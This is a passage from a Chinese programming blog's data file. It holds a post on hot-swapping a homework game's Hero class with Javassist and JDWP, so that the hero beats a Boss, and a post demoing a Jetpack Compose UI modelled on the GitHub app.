class=\"token number\">8000</span><span class=\"token punctuation\">)</span>\n    swap<span class=\"token punctuation\">.</span><span class=\"token function\">reload</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hk.asgard.rain.lesson4.lv4.Hero\"</span><span class=\"token punctuation\">,</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">toBytecode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"注意事项\"><a href=\"#注意事项\" class=\"headerlink\" title=\"注意事项\"></a>注意事项</h2><blockquote>\n<p>使用HotSwapper不止需要导入Javassist库，还需要导入tools.jar</p>\n</blockquote>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h1 id=\"利用Javassist-amp-Javagent实现类的热替换\"><a href=\"#利用Javassist-amp-Javagent实现类的热替换\" class=\"headerlink\" title=\"利用Javassist &amp; Javagent实现类的热替换\"></a>利用Javassist &amp; Javagent实现类的热替换</h1><blockquote>\n<p>几天前写红岩作业的时候，发现其中的一个level非常有意思</p>\n<p>让我们定义一个Hero类，再定义一个Boss类。设定Boss的属性远大于Hero，Hero绝无战胜Boss的可能性</p>\n<p>作业要求是让我们给Hero开个挂，秒杀Boss</p>\n<p>出这个作业的学长大概只是想考察我们对反射的掌握程度，但我发现这个作业可以整花活（因为前段时间研究了ASM和Javassist）</p>\n<p>同时我也想借这个机会解决我之前研究Javassist时碰到的疑惑</p>\n<p>于是就有了这篇文章</p>\n</blockquote>\n<h2 id=\"Javassist对热替换的实现方式\"><a href=\"#Javassist对热替换的实现方式\" class=\"headerlink\" title=\"Javassist对热替换的实现方式\"></a>Javassist对热替换的实现方式</h2><p>我之前研究了很久，到处找资料也没研究出来怎么整。不过这次我终于在网络上找到了线索，并且初步了解了它的原理。</p>\n<blockquote>\n<p>正常来说，只靠Java代码是没法替换一个已经加载到SystemClassLoader里的类的。（如果是别的ClassLoader加载的类，也许可以让加载这个类的ClassLoader不可达再手动调用gc来达到让这个类被作为垃圾回收的目的来删除一个类）但一串神奇的VM Options让我们拥有了从代码层面覆写一个类的能力。</p>\n</blockquote>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">-agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;8000<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>对于这行options的作用我并不是很清楚，但它确实让Javassist的Hotswapper类有了连接VM的能力，从此热覆写一个类的字节码便从技术层面可行了。</p>\n<p>美中不足的是只有加了这行Options才能达到效果</p>\n<h2 id=\"关键代码\"><a href=\"#关键代码\" class=\"headerlink\" title=\"关键代码\"></a>关键代码</h2><pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">/**\n * hk.asgard.rain.lesson4.Lv4\n * 4thWork\n * 三种开挂解决方案\n * 反射 javassist生成新类 热替换\n *\n * @author 寒雨\n * @since 2021/11/18 10:58\n **/</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">var</span> hero<span class=\"token operator\">:</span> Entity <span class=\"token operator\">=</span> <span class=\"token function\">Hero</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> boss <span class=\"token operator\">=</span> <span class=\"token function\">Boss</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//    bypass(hero)</span>\n<span class=\"token comment\">//    hero = javassistByPass(hero)</span>\n    <span class=\"token function\">hotSwap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>boss<span class=\"token punctuation\">.</span>speed <span class=\"token operator\">></span> hero<span class=\"token punctuation\">.</span>speed<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// Boss 先手 秒杀</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"英雄被Boss秒杀啦\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// hero 先手</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hero<span class=\"token punctuation\">.</span>damage <span class=\"token operator\">>=</span> boss<span class=\"token punctuation\">.</span>health<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"英雄开挂秒杀了Boss\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"英雄先手没能干掉Boss，被Boss反杀\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">/**\n * 开挂(反射)\n */</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">bypass</span><span class=\"token punctuation\">(</span>hero<span class=\"token operator\">:</span> Entity<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    hero<span class=\"token punctuation\">.</span><span class=\"token function\">setProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"damage\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">999999</span><span class=\"token punctuation\">)</span>\n    hero<span class=\"token punctuation\">.</span><span class=\"token function\">setProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"speed\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">400</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 用javassist生成新类并加载</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">javassistByPass</span><span class=\"token punctuation\">(</span>hero<span class=\"token operator\">:</span> Entity<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Entity <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// 获取ctClass</span>\n    <span class=\"token keyword\">val</span> ctClass <span class=\"token operator\">=</span> ClassPool<span class=\"token punctuation\">.</span><span class=\"token function\">getDefault</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hk.asgard.rain.lesson4.lv4.Hero\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 改名，否则重复加载会抛异常</span>\n    ctClass<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"hk.asgard.rain.lesson4.lv4.HeroEdited\"</span>\n    <span class=\"token comment\">// 从ctClass获取方法</span>\n    <span class=\"token keyword\">val</span> ctMethodDamage <span class=\"token operator\">=</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getDamage\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> ctMethodSpeed <span class=\"token operator\">=</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getSpeed\"</span><span class=\"token punctuation\">)</span>\n    ctMethodDamage<span class=\"token punctuation\">.</span><span class=\"token function\">setBody</span><span class=\"token punctuation\">(</span><span class=\"token raw-string string\">\"\"\"&#123;\n        return 999999L;\n    &#125;\"\"\"</span><span class=\"token punctuation\">)</span>\n    ctMethodSpeed<span class=\"token punctuation\">.</span><span class=\"token function\">setBody</span><span class=\"token punctuation\">(</span><span class=\"token raw-string string\">\"\"\"&#123;\n        return 400;\n    &#125;\"\"\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">toClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> Entity\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 热替换</span>\n<span class=\"token comment\">// 需要jvm选项 -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000 并且implementation tools.jar</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">hotSwap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// 获取ctClass</span>\n    <span class=\"token keyword\">val</span> ctClass <span class=\"token operator\">=</span> ClassPool<span class=\"token punctuation\">.</span><span class=\"token function\">getDefault</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hk.asgard.rain.lesson4.lv4.Hero\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 从ctClass获取方法</span>\n    <span class=\"token keyword\">val</span> ctMethodDamage <span class=\"token operator\">=</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getDamage\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> ctMethodSpeed <span class=\"token operator\">=</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getSpeed\"</span><span class=\"token punctuation\">)</span>\n    ctMethodDamage<span class=\"token punctuation\">.</span><span class=\"token function\">setBody</span><span class=\"token punctuation\">(</span><span class=\"token raw-string string\">\"\"\"&#123;\n        return 999999L;\n    &#125;\"\"\"</span><span class=\"token punctuation\">)</span>\n    ctMethodSpeed<span class=\"token punctuation\">.</span><span class=\"token function\">setBody</span><span class=\"token punctuation\">(</span><span class=\"token raw-string string\">\"\"\"&#123;\n        return 400;\n    &#125;\"\"\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> swap <span class=\"token operator\">=</span> <span class=\"token function\">HotSwapper</span><span class=\"token punctuation\">(</span><span class=\"token number\">8000</span><span class=\"token punctuation\">)</span>\n    swap<span class=\"token punctuation\">.</span><span class=\"token function\">reload</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hk.asgard.rain.lesson4.lv4.Hero\"</span><span class=\"token punctuation\">,</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">toBytecode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"注意事项\"><a href=\"#注意事项\" class=\"headerlink\" title=\"注意事项\"></a>注意事项</h2><blockquote>\n<p>使用HotSwapper不止需要导入Javassist库，还需要导入tools.jar</p>\n</blockquote>\n"},{"title":"初试Jetpack Compose","date":"2021-12-23T16:00:00.000Z","author":"寒雨","hide":false,"summary":"用Jetpack Compose尝试仿写了Github App的部分内容","_content":"\n# 初试Jetpack Compose\n\n今天写WanAndroid写得头晕目眩，便想换换脑子学点别的东西，于是我去了解了一下***Jetpack Compose***。并尝试用它仿写了Github App的部分内容。\n\n我一向是对DSL风格的编程十分向往的，因为我感觉这样写代码就跟写诗一样优雅。而UI编程其实一直是我的痛点。曾经在Minecraft插件开发中，我是很不擅长编写UI的。所幸Android提供了一套xml语法糖来将大部分UI逻辑与逻辑代码分离，让我对Android的ui开发还算得心应手，但我仍然十分向往使用逻辑代码来构造UI界面。于是我听说了Jetpack Compose，一种使用DSL风格的Jetpack UI框架，直接戳爆了我。\n\n于是在一个上午，我被我写的WanAndroid的代码恶心得死去活来，气得关闭了Android Studio。想着刷刷掘金，看到了一篇Compose的文章，于是就学了一上午的Compose，然后有了这个demo。\n\n## 代码\n\n~~~kotlin\nclass MainActivity : ComponentActivity() {\n    override fun onCreate(savedInstanceState: Bundle?) {\n        super.onCreate(savedInstanceState)\n        setContent {\n            ComposeTestTheme() {\n                Main()\n            }\n        }\n    }\n\n    @Composable\n    fun Main(\n        avatar: String = \"https://gitee.com/coldrain-moro/images_bed/raw/master/images/chino.jpg\",\n    ) {\n        var selectedItem by remember { mutableStateOf(0) }\n        val items = listOf(\"主页\", \"通知\", \"搜索\")\n        Scaffold(\n            bottomBar = {\n                BottomNavigation(\n                    backgroundColor = Color.White,\n                    modifier = Modifier.height(50.dp)\n                ) {\n                    items.forEachIndexed { index, item ->\n                        BottomNavigationItem(\n                            icon = {\n                                when(index){\n                                    0 -> Icon(Icons.Filled.Home, contentDescription = null)\n                                    1 -> Icon(Icons.Filled.Notifications, contentDescription = null)\n                                    else -> Icon(Icons.Filled.Search, contentDescription = null)\n                                }\n                            },\n                            label = { Text(item) },\n                            selected = selectedItem == index,\n                            onClick = { selectedItem = index },\n                        )\n                    }\n                }\n            }\n        ) {\n            Column(\n                Modifier.padding(10.dp)\n            ) {\n                Row(\n                    verticalAlignment = Alignment.CenterVertically\n                ) {\n                    Surface(\n                        shape = CircleShape,\n                    ) {\n                        Image(\n                            painter = rememberImagePainter(data = avatar),\n                            contentDescription = null,\n                            modifier = Modifier.size(40.dp),\n                            contentScale = ContentScale.Crop\n                        )\n                    }\n                    Text(\n                        text = \"主页\",\n                        style = TextStyle(\n                            fontWeight = FontWeight.Bold,\n                            fontSize = 20.sp\n                        ),\n                        modifier = Modifier.padding(15.dp)\n                    )\n                }\n                Text(\n                    text = \"我的工作\",\n                    style = TextStyle(\n                        fontWeight = FontWeight.Bold,\n                        fontSize = 16.sp\n                    ),\n                    modifier = Modifier.padding(top = 30.dp, bottom = 20.dp)\n                )\n                WorkSelection(icon = R.drawable.ic_issue_opened, text = \"议题\", Color(0xFF25CA25))\n                WorkSelection(icon = R.drawable.ic_pull_request, text = \"拉取请求\", Color(0xFF11ABF1))\n                WorkSelection(icon = R.drawable.ic_git_repository_line, text = \"仓库\", Color(0xFF8811F1))\n                WorkSelection(icon = R.drawable.ic_organization, text = \"组织\", Color(0xFFF18C11))\n                Divider(\n                    color = Color.Gray,\n                    modifier = Modifier.padding(top = 10.dp)\n                )\n                    Column(\n                        Modifier.padding(vertical = 10.dp)\n                    ) {\n                        Text(\n                            text = \"收藏夹\",\n                            style = TextStyle(\n                                fontWeight = FontWeight.Bold,\n                                fontSize = 16.sp\n                            ),\n                            modifier = Modifier.padding(bottom = 10.dp)\n                        )\n                        Text(\n                            text = \"将仓库加入收藏夹以便随时快速访问，而无需搜索\",\n                            style = TextStyle(\n                                fontSize = 16.sp\n                            ),\n                            modifier = Modifier.padding(top = 10.dp)\n                        )\n                        Column(\n                            modifier = Modifier\n                                .fillMaxWidth()\n                                .padding(top = 10.dp),\n                            horizontalAlignment = Alignment.CenterHorizontally\n                        ) {\n                            Card(\n                                modifier = Modifier.padding(horizontal = 20.dp),\n                                shape = RoundedCornerShape(20)\n                            ) {\n                                Button(\n                                    onClick = { /*TODO*/ },\n                                    elevation = null,\n                                    modifier = Modifier.fillMaxWidth(),\n                                    shape = RoundedCornerShape(20),\n                                    colors = ButtonDefaults.buttonColors(\n                                        backgroundColor = Color.Transparent\n                                    )\n                                ) {\n                                    Text(\n                                        text = \"添加收藏\",\n                                        style = TextStyle(\n                                            fontSize = 14.sp,\n                                            color = Color(0xFF229DD5)\n                                        ),\n                                        modifier = Modifier.padding(10.dp)\n                                    )\n                                }\n                            }\n                        }\n                    }\n            }\n        }\n    }\n\n    @Composable\n    fun WorkSelection(\n        icon: Int,\n        text: String,\n        color: Color\n    ) {\n        Row(\n            Modifier.padding(vertical = 10.dp),\n            verticalAlignment = Alignment.CenterVertically\n        ) {\n            // 圆角icon\n            Surface(\n                shape = RoundedCornerShape(10),\n                modifier = Modifier.padding(end = 20.dp)\n            ) {\n                Image(\n                    painter = painterResource(id = icon),\n                    contentDescription = null,\n                    modifier = Modifier\n                        .size(30.dp)\n                        .background(color),\n                    colorFilter = ColorFilter.tint(Color.White)\n                )\n            }\n            Text(\n                text = text,\n                style = TextStyle(\n                    fontSize = 15.sp\n                )\n            )\n        }\n    }\n\n    @Preview\n    @Composable\n    fun Preview() {\n        Main()\n    }\n}\n~~~\n\n## 效果\n\n感觉还行，学习一上午Compose的成果\n\n![](https://gitee.com/coldrain-moro/images_bed/raw/master/images/Screenshot_2021-12-24-22-32-59-446_kim.bifrost.co.jpg)","source":"_posts/jetpack-compose-test.md","raw":"---\ntitle: 初试Jetpack Compose\ndate: 2021-12-24\nauthor: 寒雨\nhide: false\nsummary: 用Jetpack Compose尝试仿写了Github App的部分内容\ncategories: 杂谈\ntags:\n  - Kotlin\n  - Compose\n  - Android\n---\n\n# 初试Jetpack Compose\n\n今天写WanAndroid写得头晕目眩，便想换换脑子学点别的东西，于是我去了解了一下***Jetpack Compose***。并尝试用它仿写了Github App的部分内容。\n\n我一向是对DSL风格的编程十分向往的，因为我感觉这样写代码就跟写诗一样优雅。而UI编程其实一直是我的痛点。曾经在Minecraft插件开发中，我是很不擅长编写UI的。所幸Android提供了一套xml语法糖来将大部分UI逻辑与逻辑代码分离，让我对Android的ui开发还算得心应手，但我仍然十分向往使用逻辑代码来构造UI界面。于是我听说了Jetpack Compose，一种使用DSL风格的Jetpack UI框架，直接戳爆了我。\n\n于是在一个上午，我被我写的WanAndroid的代码恶心得死去活来，气得关闭了Android Studio。想着刷刷掘金，看到了一篇Compose的文章，于是就学了一上午的Compose，然后有了这个demo。\n\n## 代码\n\n~~~kotlin\nclass MainActivity : ComponentActivity() {\n    override fun onCreate(savedInstanceState: Bundle?) {\n        super.onCreate(savedInstanceState)\n        setContent {\n            ComposeTestTheme() {\n                Main()\n            }\n        }\n    }\n\n    @Composable\n    fun Main(\n        avatar: String = \"https://gitee.com/coldrain-moro/images_bed/raw/master/images/chino.jpg\",\n    ) {\n        var selectedItem by remember { mutableStateOf(0) }\n        val items = listOf(\"主页\", \"通知\", \"搜索\")\n        Scaffold(\n            bottomBar = {\n                BottomNavigation(\n                    backgroundColor = Color.White,\n                    modifier = Modifier.height(50.dp)\n                ) {\n                    items.forEachIndexed { index, item ->\n                        BottomNavigationItem(\n                            icon = {\n                                when(index){\n                                    0 -> Icon(Icons.Filled.Home, contentDescription = null)\n                                    1 -> Icon(Icons.Filled.Notifications, contentDescription = null)\n                                    else -> Icon(Icons.Filled.Search, contentDescription = null)\n                                }\n                            },\n                            label = { Text(item) },\n                            selected = selectedItem == index,\n                            onClick = { selectedItem = index },\n                        )\n                    }\n                }\n            }\n        ) {\n            Column(\n                Modifier.padding(10.dp)\n            ) {\n                Row(\n                    verticalAlignment = Alignment.CenterVertically\n                ) {\n                    Surface(\n                        shape = CircleShape,\n                    ) {\n                        Image(\n                            painter = rememberImagePainter(data = avatar),\n                            contentDescription = null,\n                            modifier = Modifier.size(40.dp),\n                            contentScale = ContentScale.Crop\n                        )\n                    }\n                    Text(\n                        text = \"主页\",\n                        style = TextStyle(\n                            fontWeight = FontWeight.Bold,\n                            fontSize = 20.sp\n                        ),\n                        modifier = Modifier.padding(15.dp)\n                    )\n                }\n                Text(\n                    text = \"我的工作\",\n                    style = TextStyle(\n                        fontWeight = FontWeight.Bold,\n                        fontSize = 16.sp\n                    ),\n                    modifier = Modifier.padding(top = 30.dp, bottom = 20.dp)\n                )\n                WorkSelection(icon = R.drawable.ic_issue_opened, text = \"议题\", Color(0xFF25CA25))\n                WorkSelection(icon = R.drawable.ic_pull_request, text = \"拉取请求\", Color(0xFF11ABF1))\n                WorkSelection(icon = R.drawable.ic_git_repository_line, text = \"仓库\", Color(0xFF8811F1))\n                WorkSelection(icon = R.drawable.ic_organization, text = \"组织\", Color(0xFFF18C11))\n                Divider(\n                    color = Color.Gray,\n                    modifier = Modifier.padding(top = 10.dp)\n                )\n                    Column(\n                        Modifier.padding(vertical = 10.dp)\n                    ) {\n                        Text(\n                            text = \"收藏夹\",\n                            style = TextStyle(\n                                fontWeight = FontWeight.Bold,\n                                fontSize = 16.sp\n                            ),\n                            modifier = Modifier.padding(bottom = 10.dp)\n                        )\n                        Text(\n                            text = \"将仓库加入收藏夹以便随时快速访问，而无需搜索\",\n                            style = TextStyle(\n                                fontSize = 16.sp\n                            ),\n                            modifier = Modifier.padding(top = 10.dp)\n                        )\n                        Column(\n                            modifier = Modifier\n                                .fillMaxWidth()\n                                .padding(top = 10.dp),\n                            horizontalAlignment = Alignment.CenterHorizontally\n                        ) {\n                            Card(\n                                modifier = Modifier.padding(horizontal = 20.dp),\n                                shape = RoundedCornerShape(20)\n                            ) {\n                                Button(\n                                    onClick = { /*TODO*/ },\n                                    elevation = null,\n                                    modifier = Modifier.fillMaxWidth(),\n                                    shape = RoundedCornerShape(20),\n                                    colors = ButtonDefaults.buttonColors(\n                                        backgroundColor = Color.Transparent\n                                    )\n                                ) {\n                                    Text(\n                                        text = \"添加收藏\",\n                                        style = TextStyle(\n                                            fontSize = 14.sp,\n                                            color = Color(0xFF229DD5)\n                                        ),\n                                        modifier = Modifier.padding(10.dp)\n                                    )\n                                }\n                            }\n                        }\n                    }\n            }\n        }\n    }\n\n    @Composable\n    fun WorkSelection(\n        icon: Int,\n        text: String,\n        color: Color\n    ) {\n        Row(\n            Modifier.padding(vertical = 10.dp),\n            verticalAlignment = Alignment.CenterVertically\n        ) {\n            // 圆角icon\n            Surface(\n                shape = RoundedCornerShape(10),\n                modifier = Modifier.padding(end = 20.dp)\n            ) {\n                Image(\n                    painter = painterResource(id = icon),\n                    contentDescription = null,\n                    modifier = Modifier\n                        .size(30.dp)\n                        .background(color),\n                    colorFilter = ColorFilter.tint(Color.White)\n                )\n            }\n            Text(\n                text = text,\n                style = TextStyle(\n                    fontSize = 15.sp\n                )\n            )\n        }\n    }\n\n    @Preview\n    @Composable\n    fun Preview() {\n        Main()\n    }\n}\n~~~\n\n## 效果\n\n感觉还行，学习一上午Compose的成果\n\n![](https://gitee.com/coldrain-moro/images_bed/raw/master/images/Screenshot_2021-12-24-22-32-59-446_kim.bifrost.co.jpg)","slug":"jetpack-compose-test","published":1,"updated":"2022-12-12T15:54:35.874Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtm001osfklftyf0ncv","content":"<h1 id=\"初试Jetpack-Compose\"><a href=\"#初试Jetpack-Compose\" class=\"headerlink\" title=\"初试Jetpack Compose\"></a>初试Jetpack Compose</h1><p>今天写WanAndroid写得头晕目眩，便想换换脑子学点别的东西，于是我去了解了一下<em><strong>Jetpack Compose</strong></em>。并尝试用它仿写了Github App的部分内容。</p>\n<p>我一向是对DSL风格的编程十分向往的，因为我感觉这样写代码就跟写诗一样优雅。而UI编程其实一直是我的痛点。曾经在Minecraft插件开发中，我是很不擅长编写UI的。所幸Android提供了一套xml语法糖来将大部分UI逻辑与逻辑代码分离，让我对Android的ui开发还算得心应手，但我仍然十分向往使用逻辑代码来构造UI界面。于是我听说了Jetpack Compose，一种使用DSL风格的Jetpack UI框架，直接戳爆了我。</p>\n<p>于是在一个上午，我被我写的WanAndroid的代码恶心得死去活来，气得关闭了Android Studio。想着刷刷掘金，看到了一篇Compose的文章，于是就学了一上午的Compose，然后有了这个demo。</p>\n<h2 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h2><pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> MainActivity <span class=\"token operator\">:</span> <span class=\"token function\">ComponentActivity</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">onCreate</span><span class=\"token punctuation\">(</span>savedInstanceState<span class=\"token operator\">:</span> Bundle<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">onCreate</span><span class=\"token punctuation\">(</span>savedInstanceState<span class=\"token punctuation\">)</span>\n        setContent <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">ComposeTestTheme</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token function\">Main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token annotation builtin\">@Composable</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">Main</span><span class=\"token punctuation\">(</span>\n        avatar<span class=\"token operator\">:</span> String <span class=\"token operator\">=</span> <span class=\"token string\">\"https://gitee.com/coldrain-moro/images_bed/raw/master/images/chino.jpg\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">var</span> selectedItem <span class=\"token keyword\">by</span> remember <span class=\"token punctuation\">{</span> <span class=\"token function\">mutableStateOf</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">val</span> items <span class=\"token operator\">=</span> <span class=\"token function\">listOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"主页\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"通知\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"搜索\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">Scaffold</span><span class=\"token punctuation\">(</span>\n            bottomBar <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token function\">BottomNavigation</span><span class=\"token punctuation\">(</span>\n                    backgroundColor <span class=\"token operator\">=</span> Color<span class=\"token punctuation\">.</span>White<span class=\"token punctuation\">,</span>\n                    modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">height</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    items<span class=\"token punctuation\">.</span><span class=\"token function\">forEachIndexed</span> <span class=\"token punctuation\">{</span> index<span class=\"token punctuation\">,</span> item <span class=\"token operator\">-&gt;</span>\n                        <span class=\"token function\">BottomNavigationItem</span><span class=\"token punctuation\">(</span>\n                            icon <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n                                <span class=\"token keyword\">when</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                                    <span class=\"token number\">0</span> <span class=\"token operator\">-&gt;</span> <span class=\"token function\">Icon</span><span class=\"token punctuation\">(</span>Icons<span class=\"token punctuation\">.</span>Filled<span class=\"token punctuation\">.</span>Home<span class=\"token punctuation\">,</span> contentDescription <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span>\n                                    <span class=\"token number\">1</span> <span class=\"token operator\">-&gt;</span> <span class=\"token function\">Icon</span><span class=\"token punctuation\">(</span>Icons<span class=\"token punctuation\">.</span>Filled<span class=\"token punctuation\">.</span>Notifications<span class=\"token punctuation\">,</span> contentDescription <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span>\n                                    <span class=\"token keyword\">else</span> <span class=\"token operator\">-&gt;</span> <span class=\"token function\">Icon</span><span class=\"token punctuation\">(</span>Icons<span class=\"token punctuation\">.</span>Filled<span class=\"token punctuation\">.</span>Search<span class=\"token punctuation\">,</span> contentDescription <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span>\n                                